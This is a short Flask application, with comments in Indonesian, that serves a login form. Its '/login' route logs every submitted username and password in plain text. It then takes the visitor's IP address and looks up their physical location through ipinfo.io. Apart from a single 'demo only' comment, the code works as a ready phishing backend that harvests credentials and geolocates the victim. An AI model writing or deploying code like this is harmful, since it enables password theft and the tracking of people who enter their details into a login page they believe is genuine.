from flask import Flask, render_template, request
    import requests
    import json

    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template('index.html')

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form['username']
        password = request.form['password']

        # Simpan username dan password (HANYA UNTUK DEMO)
        print(f"Username: {username}, Password: {password}")

        # Dapatkan IP address
        ip_address = request.remote_addr
        print(f"IP Address: {ip_address}")

        # Dapatkan lokasi berdasarkan IP address
        try:
            response = requests.get(f'https://ipinfo.io/{ip_address}/json')
            data = response.json()
            location = data['loc']
            print(f"Location: {location}")
            return render_template('success.html', location=location)
        except:
            return "Gagal mendapatkan lokasi."

    if __name__ == '__main__':
        app.run(debug=True)
